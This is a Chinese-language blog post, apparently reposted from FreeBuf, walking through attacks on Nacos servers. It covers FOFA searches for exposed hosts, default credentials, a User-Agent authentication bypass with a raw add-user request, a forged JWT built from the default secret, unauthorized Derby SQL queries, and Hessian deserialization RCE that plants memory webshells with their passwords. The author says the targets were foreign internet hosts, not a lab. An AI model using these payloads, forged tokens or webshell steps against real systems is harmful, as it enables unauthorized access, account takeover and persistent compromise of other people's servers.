#  实战攻防之Nacos漏洞   
 黑白之道   2025-05-05 00:21  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
## 前言  
  
实战nacos漏洞复现记录一下，大佬勿喷。  
  
小白可以直接收藏下来学习一下很多poc我都直接给出来了，基本就是我的笔记。  
  
如果，有不对的可以指正一下，一起学习。  
## nacos介绍  
```
```  
  
Nacos 开放的端口  
```
```  
## 资产收集  
```
```  
  
![1745675197_680ce3bd2bc3a2978ac45.png!small?1745675198409](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaQ1pvSNDOAPwv3vDXcP5victBEaK9dsBBziaW5BrJErrbM2KNnunyLqrg/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
下面可以看到icon图标，除了开始我们上面的一种，下面还有好几个,可以点击ico图标进一步扩大信息收集面  
```
```  
  
针对fofa总结语法：  
> app="nacos" && port="8848" || icon_hash="13942501"||icon_hash="1227052603" && port="8848"  
  
  
![1745675387_680ce47b3e9cac8586d8b.png!small?1745675388280](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaIwQR3U2IEovibSUEg2EHY3cyxibaj4y0LbHORd9sJeLTHnLQ3DX3al9Q/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
漏洞复现  
  
下面我用一个国外的ip进行漏洞的复现演示，用这个语法进行查找  
> app="nacos" && port="8848" && country="US"  
  
  
使用随意一个fofa测绘工具将资产导出来  
  
![1745676256_680ce7e0874af7de9c91b.png!small?1745676257816](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiajZOOkibiapCyEruOogJVlGlqzX2mGToAJpIOlkRnd6u5KibE1IX9uZnow/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
这是我找的买过的一些资产，然后保存进行工具批量测试。  
  
charonlight/NacosExploitGUI: Nacos漏洞综合利用GUI工具，集成了默认口令漏洞、SQL注入漏洞、身份认证绕过漏洞、反序列化漏洞的检测及其利用  
  
![1745676005_680ce6e538e2da93cdbaa.png!small?1745676008544](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOialiaRfuY0WQjGOKES1lK0iazL71az1KqS69I4oxKl36tE7xsgC1OtWtog/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
![1745676138_680ce76a2bf92b995c18b.png!small?1745676139297](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaedBJToRIr2TTCkBqGD0CYxN2nB78VwSZCOVWiaVgicBYptC9mBG9acGA/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
导出一个漏洞较多的资产进行复现即可，切记不要使用国内的，直接访问ip地址看不到登录口需要加/nacos目录才会重定向过去。  
### 1.获取nacos版本信息  
> /nacos/v1/console/server/state  
  
  
![1745676439_680ce8977ba83f892f2d1.png!small?1745676440499](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOia8pwbqnav29icGdAlvpPTKmCfQibr3mZWCL5tLXA3zTjRzsgBNafcBISw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
### 2. 默认口令  
  
访问 http://ip:8848/nacos/#/login进入登陆页面  
  
![1745676481_680ce8c16e23162484df7.png!small?1745676482450](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOia0O0vrGkdtah21avqbuDeJxRXzksb5Yf06VyWOwsHVDIEdpdrEoJkKA/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
> 默认口令为： nacos/nacos  
  
### 3.默认未开启鉴权-未授权查看用户信息  
  
由于系统默认未开启鉴权 导致未授权访问  
> nacos.core.auth.enabled=false  
  
#### 漏洞复现  
  
测试版本：nacos1.4.0  
  
直接访问如下路径，未授权查看用户信息  
> /nacos/v1/auth/users?pageNo=1&pageSize=9  
  
  
![1745676647_680ce9670e9bd209e260a.png!small?1745676648311](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaqmJd48lMJgibATGuiaSqxlwzQ00Pnt2YaapUxpUHaCicmKMKhzXJic7qDA/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
### 4. User-Agent权限绕过（CVE-2021-29441）  
  
漏洞描述: 该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。  
  
  
版本: <=Nacos 1.4.1 配置为使用身份验证（nacos.core.auth.enabled=true）  
  
直接访问下面的目录，可以未授权查看到账号密码  
> /nacos/v1/auth/users?pageNo=1&pageSize=100 //可查看到用户列表  
  
  
可以看下里面的账号密码，很多情况下账号密码都是这个暴露出来的username，和password信息  
  
![1745676741_680ce9c55f4947f8b971a.png!small?1745676742604](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaA9yJbOx2mwfib11UT7ZPsJbRxlsx41qOm155icZibHN6yVCfgKLI2VB2Q/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
未授权添加用户  
  
payload:  
> POST /nacos/v1/auth/users HTTP/1.1  
  
Host:   
  
User-Agent: Nacos-Server  
  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
  
Accept-Encoding: gzip, deflate, br  
  
Connection: keep-alive  
  
Upgrade-Insecure-Requests: 1  
  
If-Modified-Since: Wed, 28 Jul 2021 11:28:45 GMT  
  
Priority: u=0, i  
  
Content-Type: application/x-www-form-urlencoded  
  
Content-Length: 30  
> username=test&password=test123  
  
  
![1745676819_680cea13ec72d1e677f5b.png!small?1745676821124](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaKHIdibthRkQwHic6jbXLrxEPHGupewVYZyBk533sE9dU6qGwMbFdiamSw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
查看用户是否添加成功:  
  
/nacos/v1/auth/search?username=test  
  
![1745676873_680cea49caca169b83348.png!small?1745676874750](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOia51fbdmibia0TfYiaVrdHafNm4EKroNib2DzoHJ78RIdicicf0MpPn3V1nFqg/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
curl 'http://IP/v1/auth/search?username=test'  
  
![1745677097_680ceb298949373a428b8.png!small?1745677098528](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaMIHn9rCNdEqIiaibP1I6iarKR7mnkTT7eS0FPgs4NXaLPfZLpicAqho9JQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
![1745676942_680cea8ee5ec9dce1458c.png!small](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiapLXfA7XTfTUQE6UDDo7GbXDYJccE2bknnFNicJdXKib4oHrbvQOV8b2A/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
删除用户  
  
curl -X DELETE "http://47.83.174.204:8848/nacos/v1/auth/users?username=test"  
  
或者访问 /nacos/v1/auth/users?username=test，将请求方法修改为DELETE即可删除用户test  
  
![1745677123_680ceb43a13d124bfeafc.png!small?1745677124621](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOia2j2hYLqGcd3rWVqRHpicQ5LNwKiaEPQ2xYBiaQTkWL0gvCiab8zPl0OwkQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
或者使用工具直接进行用户的添加  
  
先将有漏洞的站点扫描一遍选择ua权限绕过漏洞进行添加  
  
![1745677152_680ceb600ff9436bd9502.png!small?1745677153243](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaxJAvibqW2vaABZhOXRB49mycibd0FWrfEc6bCic0bYcmibSFADLd4cgvkw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
![1745677162_680ceb6ab37c475c3937a.png!small?1745677164028](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaPz96QcupPQT0gHL9AKLQiaepyoQmkagfib2yWTDpshgFja26oAURf4XA/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
### 5.默认jwt密钥-未授权访问  
  
开启了nacos.core.auth.enabled 的情况下，如果未修改默认nacos.core.auth.default.token.secret.key的值（在Nacos<=2.2.0版本中，该值为默认值），则可以通过accessToken值来绕过权限。  
> nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789 # =后边的是默认的硬编码  
  
  
**影响版本**  
  
0.1.0<=nacos<=2.2.0  
#### 漏洞原理  
  
输入正确的账号密码，则后端会返回对应该用户的加密accessToken。  
  
请求包  
> POST /nacos/v1/auth/users/login HTTP/1.1  
  
Host:  
  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0  
  
Accept: application/json, text/plain, */*  
  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
  
Accept-Encoding: gzip, deflate, br  
  
Content-Type: application/x-www-form-urlencoded  
  
Content-Length: 29  
  
Origin: http://47.83.174.204:8848  
  
Connection: keep-alive  
  
Referer: http://47.83.174.204:8848/nacos/  
  
Priority: u=0  
> username=nacos&password=nacos  
  
  
响应包  
> HTTP/1.1 200   
  
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc0NTY4MDYxOH0.ZLnKCsDmI768h5_ALTANhnvD0ObfSgetZj8LmUy8TjE  
  
Content-Type: application/json;charset=UTF-8  
  
Date: Sat, 26 Apr 2025 10:16:58 GMT  
  
Keep-Alive: timeout=60  
  
Connection: keep-alive  
  
Content-Length: 181  
> {"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc0NTY4MDYxOH0.ZLnKCsDmI768h5_ALTANhnvD0ObfSgetZj8LmUy8TjE","tokenTtl":18000,"globalAdmin":true,"username":"nacos"}  
  
  
![1745677349_680cec25dde60b82723a6.png!small?1745677351084](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiabXmFSGiac3aFzTiaW4YcFkOPnAooNLKkqruxwkTkobgiaZibjftB1UVk5w/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
客户端得到此accessToken后会使用此Token再次请求后端服务器，及通过该用户身份登录。  
  
![1745677380_680cec441d38101332f99.png!small?1745677381194](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaZSuDQXVwB6SsEPtweJ135Gq1ibofrhkUyufF0AoRibZbIHb2tALxjDpQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
payload  
> GET /nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImlhdCI6MTc0NTgzNTYwOH0.gk9tFDRWDozKj-fsLAXSxnpojBklSaOVPNbUneqTSpw HTTP/1.1  
  
Host:   
  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0  
  
Accept: application/json, text/plain, */*  
  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
  
Accept-Encoding: gzip, deflate, br  
  
Origin: http://47.83.174.204:8848  
  
Connection: keep-alive  
  
Referer: http://47.83.174.204:8848/nacos/  
  
Priority: u=0  
  
  
```
```  
  
由于返回的accessToken只是对账号进行加密得到的.  
  
而且nacos加密用户accessToken使用的jwt默认密钥加密，也就是只要知到nacos的用户，任何人都能通过此密钥加密用户得到对应用户的accessToken.  
  
nacos存在默认用户nacos，所以我们可以尝试获取此默认用户的nacos。  
  
漏洞复现  
  
测试版本：nacos1.4.0  
  
1. 生成时间戳比现在时间晚就行，比如现在时间为2024.9.3，则修改为2024.9.4或者更晚的时间  
> https://tool.lu/timestamp/  
  
  
![1745677522_680cecd2e55aae22cf8b5.png!small?1745677523833](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOia26lNcnUx5cicXWCSn86eQ7bNaJtNRXIG8rUru43bmNrJ8kNLmeh2rTQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
我直接生成到2080了直接用我的就行  
> 3481367106  
  
  
2. 生成key。  
> https://jwt.io/  
  
  
复制默认的key，填写如下所示  
  
![1745677696_680ced801ebcd3aeae030.png!small?1745677697286](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaHzMkMY0wafXEmSaz9Iu2ErmshYpib68xb0wm6MYoydicJh6ibcwfkxicQQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImlhdCI6MTc0NTgzNTYwOH0.gk9tFDRWDozKj-fsLAXSxnpojBklSaOVPNbUneqTSpw  
>   
> {  
  
"sub": "nacos",  
  
"iat": 1745835608  
  
}  
> {  
  
"alg": "HS256",  
  
"typ": "JWT"  
  
}  
>   
> 带上token访问用户列表即可绕过403  
  
  
![1745677738_680cedaa713e0c9d53c9a.png!small?1745677740114](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaotYQI2NyQRgLbfLoezYMLZqKjvNUllzhIVrEbV5hW8Xy2F7OGBLKXg/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
**直接登录到后台**  
：  
  
登陆界面输入任意账户密码 ，点击登录。抓包，添加请求头,我这个还能用。  
> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MzQ4MTM1NzA1NX0.92Mo2gkDFuPnUaD2v63SQl1IWtObfBxDTWgIhqvteM8  
  
  
添加之后点击放行不要关闭拦截  
  
![1745677817_680cedf94dbba1a1d2a20.png!small?1745677818748](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaMXbtQLmYYe1Rd82YNP7hJXF5IAbuIFXeia7RDicoqw3YpAnzvkZh9C5A/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
![1745677843_680cee13962967d8cd090.png!small?1745677844715](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiar7D3vLJXiaxluSP47QmRv4wKI0h0MSoiacDD2JMwScQmeBsX0oCw7PBQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
之后关闭拦截即可  
### 6.Derby未授权访问（CVE-2021-29442）  
  
nacos带有一个嵌入式的小型数据库derby，默认无需认证即可被访问，并执行任意sql查询，导致敏感信息泄露。  
  
影响版本：在nacos <= 1.4.0，无论是否开启鉴权，该漏洞都存在。当 nacos >1.4.0， 在新版中默认没开鉴权，所有这个漏洞还存在。若开启了鉴权，版本大于1.4.0，则漏洞不存在。  
> /nacos/v1/cs/ops/derby?sql=select * from users  
  
  
![1745677914_680cee5aebd72b48a7c0d.png!small?1745677916250](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaiayodU5H99dibicZwko8XJEic69z5XONVOEx7a1VYyqguPop7mbCc1TLuw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
### 7.Nacos Client Yaml反序列化漏洞  
  
这个我没复现出来，网上找了几个但是都没有。。。。  
  
在1.4.1版本中存在Nacos Client Yaml反序列化漏洞，该漏洞只影响单独使用 nacos-client SDK的用户，原因在于spring cloud、springboot、dubbo等框架中并非使用的 AbstractConfigChangeListener 监听配置，所以该漏洞只影响了使用AbstractConfigChangeListener监听配置的客户端。  
  
具体思路是  
#### nacosYaml反序列化攻击  
  
工具利用  
  
https://github.com/artsploit/yaml-payload/  
  
下载之后打成jar包  
> javac src/artsploit/AwesomeScriptEngineFactory.java  
> 编译java文件  
> jar -cvf yaml-payload.jar -C src/ .  
> jar：Java 自带的归档工具（类似 tar 或 zip），用于创建、查看或解压 JAR 文件。  
  
-c（create）：创建一个新的 JAR 文件。  
  
-v（verbose）：显示详细输出（打包的文件列表）。  
  
-f（file）：指定生成的 JAR 文件名（这里是 yaml-payload.jar）。  
  
-C src/：切换到 src/ 目录（相当于 cd src/）。  
>   
  
  
![1745678441_680cf06949f4a11a3512b.png!small](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOia7M3VDcjGfPuSeasntrxnP8y4Rj9WqJt0AswdZiaHzqh38xTMUKhm5Zw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
将生成的jar文件传到服务器上，到指定目录，开启web服务  
  
![1745678357_680cf015131458ecbdea9.png!small?1745678358033](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiak66ibP7Y3FSIoGXYuL2fv61M9bIa68NKdGtyvLsrjObYNvHQmnib2INg/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
在Nacos发现dataid为db-config  
  
![1745678469_680cf0859a5bea8fa0b14.png!small?1745678470753](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaTEqrGSjgdnmfHOnGyjuXgrJJCQricIKkZj842tJtdoVtWVc2GIBA9fQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
![1745678541_680cf0cd93657628b8f30.png!small?1745678542500](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaf6QDfDALneyic81IicRCoofd1NmuvDt8pLN0DhYNb8CiaQz8P5FibHGDMQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
我只是复现到这了，试了几个，没成功就停了。  
  
这个是靶场成功的链接  
  
内网渗透 -春秋云镜篇之Hospital-腾讯云开发者社区-腾讯云  
### 8.Nacos Hessian 反序列化漏洞  
  
由于7848端口采用hessian协议传输数据，反序列化未设置白名单导致存在RCE漏洞。  
  
影响版本：1.4.0<=Nacos<1.4.6, 2.0.0<Nacos<2.2.3  
  
Nacos 1.x在单机模式下默认不开放7848端口，故该情况通常不受此漏洞影响，但是集群模式受影响。然而，2.x版本无论单机或集群模式均默认开放7848端口。  
  
主要受影响的是7848端口的Jraft服务。  
  
漏洞复现  
  
测试版本nacos 2.2.2  
  
poc：https://github.com/c0olw/NacosRce  
```
```  
  
执行命令同时注入内存马  
  
![1745678676_680cf1546f94f76df98f3.png!small?1745678677661](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiauRx7CocqfL7tSOPPwzvCOQlCicwmaTWM009ibP6fiaEsGp7b9BrlGV3VQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
直接使用webshell管理工具进行链接即可  
> 自动注入内存马并执行命令 java -jar NacosRce.jar Url Jraft端口 "Command"  
> java -jar NacosRce.jar http://192.168.90.1:8848/nacos  7848 "whoami"  
  
只注入内存马  
> java -jar NacosRce.jar http://192.168.90.1:8848/nacos 7848 memshell  
> 内存马说明：  
  
一、冰蝎内存马：  
  
1、需要设置请求头x-client-data:rebeyond  
  
2、设置Referer:https://www.google.com/  
  
3、路径随意  
  
4、密码rebeyond  
  
二、哥斯拉内存马：  
  
1、需要设置请求头x-client-data:godzilla  
  
2、设置Referer:https://www.google.com/  
  
3、路径随意  
  
4、密码是pass 和 key  
> 三、CMD内存马：  
  
1、需要设置请求头x-client-data:cmd  
  
2、设置Referer:https://www.google.com/  
  
3、请求头cmd:要执行的命令  
  
v0.5版本实现了：  
  
1、不出网漏洞利用  
  
2、可多次发起漏洞利用  
  
3、同时注入冰蝎/哥斯拉/CMD内存马  
  
4、内存马对nacos多版本进行了兼容  
> tips:  
  
1、请用jdk1.8  
  
2、适用于 Nacos 2.x <= 2.2.2  
  
3、非集群的也能打哦  
  
4、此内存马重启nacos依然存活  
> 关于Windows  
  
如用下面的方式执行，注入内存马时会生成临时文件 C:\Windows\Temp\nacos_data_temp 和 C:\Windows\Temp\nacos_data_temp.class 文件  
> java -jar NacosRce.jar http://192.168.90.1:8848  7848 "whoami" windows  
> 如果没有在最后加 windows，临时文件会在 /tmp/nacos_data_temp /tmp/nacos_data_temp.class，所以权限足够的话，不指定windows也能打成功  
  
windows 没打成功也许是因为没权限操作C盘或其他原因  
  
## 9. Nacos RCE  
  
这个漏洞涉及两个路径，其中derby其实就是CVE-2021-29441  
> /nacos/v1/cs/ops/data/removal  
  
/nacos/v1/cs/ops/derby  
  
  
测试版本：nacos1.4.0（2.3.2也成功），默认状态  
  
下载poc：GitHub - FFR66/Nacos_Rce: 网传nacos_rce漏洞poc，并上传到vps上  
  
1. 在vps启动  
> python service.py  
  
  
![1745678823_680cf1e7556484031a24f.png!small?1745678824303](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaWCv6qSfg23ASNYSL5vdeFjKurgdMJaMIsSvLzUicg205IKoic1GHKsLQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
默认会在5000端口打开服务  
  
然后本地机器上执行poc  
  
当系统为未授权访问时，可直接触发RCE  
> Nacos_Rce.py -t 192.168.67.129 -p 5000 -u http://192.168.67.134:8848 -c whoami  
  
#-t vps ip  
> #-p 端口地址  
  
#-u nacos web地址  
> # -c 指定命令  
  
  
![1745678912_680cf2402068fd3432702.png!small?1745678913356](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiahAuHXrTBrgHicuCUfIfHu7zrMpeRL9YpXiaxAHAib8sFAWR6UqtF3iaRDw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
如果显示未知用户或者未找到用户，则表示nacos启用了鉴权需要伪造JWT绕过登陆授权，在文件Nacos_Rce.py文件中设置请求头即可。只要能够绕过登陆授权，就可能能RCE。  
  
![1745678996_680cf29493053a3421735.png!small?1745678997694](https://mmbiz.qpic.cn/mmbiz_jpg/iar31WKQlTTrjpEujD1ZWxGGw7qZEafOiaBZc7dz3kUGm9wKTUxZZHX8sgvAKpcShO7junCiaH4W6HG9ppmjvQiakg/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
> header = {  
  
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like             Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',  
  
'Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MzQ4MTM1NzA1NX0.92Mo2gkDFuPnUaD2v63SQl1IWtObfBxDTWgIhqvteM8'  
  
}  
  
### 10. 密码破解  
### nacos密码bcrypt  
> hashcat -a 0 -m 3200 hashes.txt rockyou.txt -w 3 -O -D 1,2 --show  
  
### 配置文件密文 jasypt  
> java -cp jasypt-1.9.3.jar org.jasypt.intf.cli.JasyptPBEStringEncryptionCLI input="123456" password="salt123" algorithm="PBEWithMD5AndDES"  
  
java -cp jasypt-1.9.3.jar org.jasypt.intf.cli.JasyptPBEStringDecryptionCLI input="MecKdyPwwkD+AqUKPy1GlQ==" password="salt123" algorithm="PBEWithMD5AndDES"  
  
### 11、常用命令  
> http://127.0.0.1:8848/nacos/v1/console/server/state  
  
http://xx.xx.xx.xx/v1/console/server/state  
  
http://127.0.0.1:8848/nacos/v1/auth/users?search=accurate&pageNo=1&pageSize=9   get查询用户  
  
curl -v --data-binary "username=test&password=123456" "http://127.0.0.1:8848/nacos/v1/auth/users"  post添加用户  
  
curl -X PUT 'http://127.0.0.1:8848/nacos/v1/auth/users?accessToken=' -d 'username=test&newPassword=test123'  修改密码  
  
http://127.0.0.1:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99  获取配置信息  
  
http://127.0.0.1:8848/nacos/v1/core/cluster/nodes  获取集群信息  
  
curl --data-binary "username=nacos&password=nacos" "http://127.0.0.1:8848/nacos/v1/auth/users/login"  登陆  
  
###   
## 总结  
  
**在网络安全的世界里，停止学习就意味着落后，共勉！**  
  
****  
****  
原文链接：  
https://www.freebuf.com/articles/web/428863.html  
  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
